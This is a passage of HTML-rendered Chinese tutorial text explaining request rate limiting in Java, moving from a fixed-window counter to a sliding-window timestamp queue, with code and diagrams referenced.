data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1918:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1919"> <span data-slate-object="text" data-key="1920"><span data-slate-leaf="true" 
data-offset-key="1920:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1920:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9791526735" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1920:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1920:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7653190876" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="1920:4"><span data-slate-string="true"> start = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1921"> <span data-slate-object="text" data-key="1922"><span data-slate-leaf="true" 
data-offset-key="1922:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1922:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1017950532" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1922:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1922:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2556371799" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1922:4"><span data-slate-string="true"> count = </span></span><span 
data-slate-leaf="true" data-offset-key="1922:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6056750481" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1922:6"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1923"> <span data-slate-object="text" data-key="1924"><span data-slate-leaf="true" 
data-offset-key="1924:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1925"> <span data-slate-object="text" data-key="1926"><span data-slate-leaf="true" 
data-offset-key="1926:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1926:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7479332847" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1926:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4534195230" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1926:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7031583905" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="1926:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4534195230" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1926:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_7583830113" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1926:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_3781233035" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1926:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1926:8"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1927"> <span data-slate-object="text" data-key="1928"><span data-slate-leaf="true" 
data-offset-key="1928:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1928:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3447213492" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="1928:2"><span data-slate-string="true"> now = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1929"> <span data-slate-object="text" data-key="1930"><span data-slate-leaf="true" 
data-offset-key="1930:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1930:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5247138941" data-annotation-type="annotation"><span data-slate-string="true">if</span></span></span><span 
data-slate-leaf="true" data-offset-key="1930:2"><span data-slate-string="true"> (now-start 
&gt; </span></span><span data-slate-leaf="true" data-offset-key="1930:3"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_9289937905" data-annotation-type="annotation"><span 
data-slate-string="true">60</span></span></span><span data-slate-leaf="true" data-offset-key="1930:4"><span 
data-slate-string="true">*</span></span><span data-slate-leaf="true" data-offset-key="1930:5"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_6629364189" 
data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="1930:6"><span data-slate-string="true">) {</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1931"> <span data-slate-object="text" data-key="1932"><span data-slate-leaf="true" 
data-offset-key="1932:0" data-first-offset="true"><span data-slate-string="true"> start = now 
- (now-start)%(</span></span><span data-slate-leaf="true" data-offset-key="1932:1"><span class=" 
gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_3098017075" data-annotation-type="annotation"><span 
data-slate-string="true">60</span></span></span><span data-slate-leaf="true" data-offset-key="1932:2"><span 
data-slate-string="true">*</span></span><span data-slate-leaf="true" data-offset-key="1932:3"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_7260110123" 
data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="1932:4"><span data-slate-string="true">); </span></span><span 
data-slate-leaf="true" data-offset-key="1932:5"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_3789160889" data-annotation-type="annotation"><span data-slate-string="true">// 
所在时间窗口的起始位置</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1933"> <span data-slate-object="text" data-key="1934"><span 
data-slate-leaf="true" data-offset-key="1934:0" data-first-offset="true"><span data-slate-string="true"> 
count = </span></span><span data-slate-leaf="true" data-offset-key="1934:1"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_5580981693" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="1934:2"><span 
data-slate-string="true">;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1935"> <span data-slate-object="text" 
data-key="1936"><span data-slate-leaf="true" data-offset-key="1936:0" data-first-offset="true"><span 
data-slate-string="true"> }</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1937"> <span data-slate-object="text" 
data-key="1938"><span data-slate-leaf="true" data-offset-key="1938:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1939"> <span data-slate-object="text" 
data-key="1940"><span data-slate-leaf="true" data-offset-key="1940:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1940:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0233043457" 
data-annotation-type="annotation"><span data-slate-string="true">if</span></span></span><span 
data-slate-leaf="true" data-offset-key="1940:2"><span data-slate-string="true"> (count &lt; 
</span></span><span data-slate-leaf="true" data-offset-key="1940:3"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_4688712315" data-annotation-type="annotation"><span 
data-slate-string="true">10000</span></span></span><span data-slate-leaf="true" data-offset-key="1940:4"><span 
data-slate-string="true">) {</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1941"> <span data-slate-object="text" 
data-key="1942"><span data-slate-leaf="true" data-offset-key="1942:0" data-first-offset="true"><span 
data-slate-string="true"> count++;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1943"> <span data-slate-object="text" 
data-key="1944"><span data-slate-leaf="true" data-offset-key="1944:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1944:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7579753185" 
data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="1944:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1944:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0584623544" data-annotation-type="annotation"><span data-slate-string="true">true</span></span></span><span 
data-slate-leaf="true" data-offset-key="1944:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1945"> <span data-slate-object="text" data-key="1946"><span data-slate-leaf="true" 
data-offset-key="1946:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1947"> <span data-slate-object="text" data-key="1948"><span data-slate-leaf="true" 
data-offset-key="1948:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1948:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0981634958" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="1948:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1948:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7401628015" data-annotation-type="annotation"><span data-slate-string="true">false</span></span></span><span 
data-slate-leaf="true" data-offset-key="1948:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1949"> <span data-slate-object="text" data-key="1950"><span data-slate-leaf="true" 
data-offset-key="1950:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1951"> <span data-slate-object="text" data-key="1952"><span data-slate-leaf="true" 
data-offset-key="1952:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 243px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-f6860412 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1953"> <span data-slate-object="text" data-key="1954"><span data-slate-leaf="true" 
data-offset-key="1954:0" data-first-offset="true"><span data-slate-string="true">这样这个问题似乎就得到了解决。</span></span></span><span 
data-slate-object="text" data-key="1955"><span data-slate-leaf="true" data-offset-key="1955:0" 
data-first-offset="true"><span class="se-768fb857" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">可是，刚才我们在解决问题的时候，似乎“擅自”强化了一个条件……</span></span></span></span> </div> 
<h3 class="se-081c7bda" data-slate-type="heading" data-slate-object="block" data-key="1956"><span 
data-slate-object="text" data-key="1957"><span data-slate-leaf="true" data-offset-key="1957:0" 
data-first-offset="true"><span data-slate-string="true">从固定窗口到滑动窗口</span></span></span></h3> 
<div class="se-3fa50e09 " data-slate-type="paragraph" data-slate-object="block" data-key="1958"> 
<span data-slate-object="text" data-key="1959"><span data-slate-leaf="true" data-offset-key="1959:0" 
data-first-offset="true"><span data-slate-string="true">这个条件就是“固定时间窗口”。</span></span></span> 
</div> <div class="se-532dad1b " data-slate-type="paragraph" data-slate-object="block" data-key="1960"> 
<span data-slate-object="text" data-key="1961"><span data-slate-leaf="true" data-offset-key="1961:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，从 3:00 到 3:01 这一分钟时间内，假如系统收到了 
9000 个请求，而在 3:01 到 3:02 这接着的一分钟内，系统也收到了 9000 个请求，二者都满足要求。但是，这是我们给了一个假定的增强条件——固定时间窗口，而得到的结论。</span></span></span> 
</div> <div class="se-7fc90586 " data-slate-type="paragraph" data-slate-object="block" data-key="1962"> 
<span data-slate-object="text" data-key="1963"><span data-slate-leaf="true" data-offset-key="1963:0" 
data-first-offset="true"><span data-slate-string="true">假如说前面这 9000 个请求都分布在 3:00:30 到 3:01:00 
之间，后面这 9000 个请求都分布在 3:01:00 到 3:01:30 之间，即从 3 点 00 分 30 秒 到 3 点 01 分 30 秒这一分钟内，系统居然接纳了 9000 
+ 9000 = 18000 个请求。因此，如果我们考虑的是“滑动时间窗口”，这显然违背了我们的每分钟一万次最大请求量的规则。请看下图：</span></span></span> </div> 
<div class="se-89b3eceb" data-slate-type="image" data-slate-object="block" data-key="1964"> 
<img class="se-192415c0" src="https://static001.geekbang.org/resource/image/2d/1b/2d376db8e707852fc10d21530837fa1b.png"> 
</div> <div class="se-3f44c20f " data-slate-type="paragraph" data-slate-object="block" data-key="1965"> 
<span data-slate-object="text" data-key="1966"><span data-slate-leaf="true" data-offset-key="1966:0" 
data-first-offset="true"><span data-slate-string="true">因此，相较来说，更实际的情况下，我们是要支持滑动时间窗口，也就是任意一分钟的时间窗口内，都要满足小于 
10000 请求量的规则。看来，简单计数法需要改进。</span></span></span> </div> <h3 class="se-c156298f" data-slate-type="heading" 
data-slate-object="block" data-key="1967"><span data-slate-object="text" data-key="1968"><span 
data-slate-leaf="true" data-offset-key="1968:0" data-first-offset="true"><span data-slate-string="true">时间队列</span></span></span></h3> 
<div class="se-1a8b3096 " data-slate-type="paragraph" data-slate-object="block" data-key="1969"> 
<span data-slate-object="text" data-key="1970"><span data-slate-leaf="true" data-offset-key="1970:0" 
data-first-offset="true"><span class="se-dcd2a0a0" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">对于滑动窗口的问题，我们经常要引入队列来解决问题。</span></span></span></span><span data-slate-object="text" 
data-key="1971"><span data-slate-leaf="true" data-offset-key="1971:0" data-first-offset="true"><span 
data-slate-string="true">因为队列的特点是先进先出，一头进，另一头出，而很多滑动窗口的问题，恰恰需要这个特性，这个问题也不例外。</span></span></span> 
</div> <div class="se-478e1879 " data-slate-type="paragraph" data-slate-object="block" data-key="1972"> 
<span data-slate-object="text" data-key="1973"><span data-slate-leaf="true" data-offset-key="1973:0" 
data-first-offset="true"><span data-slate-string="true">假如我们维护一个最近时间戳的队列，这个队列长度不能超过 10000，那么，当新的请求到来的时候，我们只需要找到从“当前时间减 
1 分钟”到“当前时间”这样一个滑动窗口区间。如果队列的尾部有任何存储的时间戳在这个区间之外（一分钟以前），那我们就把它从队列中拿掉。如果队列长度小于 10000，那么这个新的请求的时间戳就可以入队列，允许请求访问；反之，则不允许请求访问。请看下图：</span></span></span> 
</div> <div class="se-0c888939" data-slate-type="image" data-slate-object="block" data-key="1974"> 
<img class="se-2875e822" src="https://static001.geekbang.org/resource/image/80/e0/8002fa4ef1491a6ec8fd32d504e9bae0.png"> 
</div> <div class="se-901b2c82 " data-slate-type="paragraph" data-slate-object="block" data-key="1975"> 
<span data-slate-object="text" data-key="1976"><span data-slate-leaf="true" data-offset-key="1976:0" 
data-first-offset="true"><span data-slate-string="true">这个过程，参考代码如下：</span></span></span> </div> 
<div class="se-1debc909 se-21ff4957" data-slate-type="pre" data-slate-object="block" data-key="1977" 
data-code-language="cpp"> <div class="se-cf5b8ab1 se-b9b59ec4"> <span></span> </div> <div class="se-2bccab69"> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="1"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="2"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="3"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="4"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="5"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="6"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="7"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="8"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="9"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="10"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="11"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="12"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="13"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="14"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="15"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="16"></div> </div> <div class="se-28efa360 
ps ps--active-x"> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1978"> <span data-slate-object="text" data-key="1979"><span data-slate-leaf="true" 
data-offset-key="1979:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5791910948" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="1979:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1979:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5385416722" data-annotation-type="annotation"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_1394708803" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="1979:3"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_1394708803" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="1979:4"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_9240620701" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_1394708803" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1979:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_1394708803" 
data-annotation-type="annotation"><span data-slate-string="true"> {</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1980"> <span data-slate-object="text" data-key="1981"><span data-slate-leaf="true" 
data-offset-key="1981:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1981:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8852669608" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1981:2"><span data-slate-string="true"> Queue&lt;Long&gt; 
</span></span><span data-slate-leaf="true" data-offset-key="1981:3"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_1666523551" data-annotation-type="annotation"><span 
data-slate-string="true">queue</span></span></span><span data-slate-leaf="true" data-offset-key="1981:4"><span 
data-slate-string="true"> = </span></span><span data-slate-leaf="true" data-offset-key="1981:5"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7384714456" 
data-annotation-type="annotation"><span data-slate-string="true">new</span></span></span><span 
data-slate-leaf="true" data-offset-key="1981:6"><span data-slate-string="true"> LinkedList&lt;&gt;();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1982"> <span data-slate-object="text" data-key="1983"><span data-slate-leaf="true" 
data-offset-key="1983:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1984"> <span data-slate-object="text" data-key="1985"><span data-slate-leaf="true" 
data-offset-key="1985:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1985:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7892266872" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8897533932" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1985:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7892266872" 
data-annotation-type="annotation"><span data-slate-string="true"> boolean </span></span></span><span 
data-slate-leaf="true" data-offset-key="1985:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7892266872" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6355927646" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1985:4"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7892266872" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_4278459909" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1985:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7892266872" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1985:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1986"> <span data-slate-object="text" data-key="1987"><span data-slate-leaf="true" 
data-offset-key="1987:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1987:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4143104106" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="1987:2"><span data-slate-string="true"> now = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1988"> <span data-slate-object="text" data-key="1989"><span data-slate-leaf="true" 
data-offset-key="1989:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1989:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1758033121" data-annotation-type="annotation"><span data-slate-string="true">while</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:2"><span data-slate-string="true"> (!</span></span><span 
data-slate-leaf="true" data-offset-key="1989:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_8317865210" data-annotation-type="annotation"><span data-slate-string="true">queue</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:4"><span data-slate-string="true">.isEmpty() &amp;&amp; 
</span></span><span data-slate-leaf="true" data-offset-key="1989:5"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_6874556576" data-annotation-type="annotation"><span 
data-slate-string="true">queue</span></span></span><span data-slate-leaf="true" data-offset-key="1989:6"><span 
data-slate-string="true">.peek() &lt; now</span></span><span data-slate-leaf="true" data-offset-key="1989:7"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_8989623835" 
data-annotation-type="annotation"><span data-slate-string="true">-60</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:8"><span data-slate-string="true">*</span></span><span 
data-slate-leaf="true" data-offset-key="1989:9"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1995711320" data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:10"><span data-slate-string="true">) {</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1990"> <span data-slate-object="text" data-key="1991"><span data-slate-leaf="true" 
data-offset-key="1991:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1991:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_0340163379" data-annotation-type="annotation"><span data-slate-string="true">// 
如果请求已经是在一分钟以前了，忽略</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1992"> <span data-slate-object="text" data-key="1993"><span 
data-slate-leaf="true" data-offset-key="1993:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1993:1"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_7188099805" data-annotation-type="annotation"><span 
data-slate-string="true">queue</span></span></span><span data-slate-leaf="true" data-offset-key="1993:2"><span 
data-slate-string="true">.remove();</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1994"> <span data-slate-object="text" 
data-key="1995"><span data-slate-leaf="true" data-offset-key="1995:0" data-first-offset="true"><span 
data-slate-string="true"> }</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1996"> <span data-slate-object="text" 
data-key="1997"><span data-slate-leaf="true" data-offset-key="1997:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1997:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_4949080703" 
data-annotation-type="annotation"><span data-slate-string="true">if</span></span></span><span 
data-slate-leaf="true" data-offset-key="1997:2"><span data-slate-string="true"> (</span></span><span 
data-slate-leaf="true" data-offset-key="1997:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_5364249026" data-annotation-type="annotation"><span data-slate-string="true">queue</span></span></span><span 
data-slate-leaf="true" data-offset-key="1997:4"><span data-slate-string="true">.size() &lt; 
</span></span><span data-slate-leaf="true" data-offset-key="1997:5"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_4800302325" data-annotation-type="annotation"><span 
data-slate-string="true">10000</span></span></span><span data-slate-leaf="true" data-offset-key="1997:6"><span 
data-slate-string="true">) {</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1998"> <span data-slate-object="text" 
data-key="1999"><span data-slate-leaf="true" data-offset-key="1999:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1999:1"><span 
class=" gkhl-built_in" data-slate-object="annotation" data-annotation-key="gkann_7035310563" 
data-annotation-type="annotation"><span data-slate-string="true">queue</span></span></span><span 
data-slate-leaf="true" data-offset-key="1999:2"><span data-slate-string="true">.add(now);</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2000"> <span data-slate-object="text" data-key="2001"><span data-slate-leaf="true" 
data-offset-key="2001:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2001:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8167969990" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="2001:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2001:3"><span class=" gkhl-literal" data-slate-object="annotation" 
data-annotation-key="gkann_4189930925" data-annotation-type="annotation"><span data-slate-string="true">true</span></span></span><span 
data-slate-leaf="true" data-offset-key="2001:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2002"> <span data-slate-object="text" data-key="2003"><span data-slate-leaf="true" 
data-offset-key="2003:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2004"> <span data-slate-object="text" data-key="2005"><span data-slate-leaf="true" 
data-offset-key="2005:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2005:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
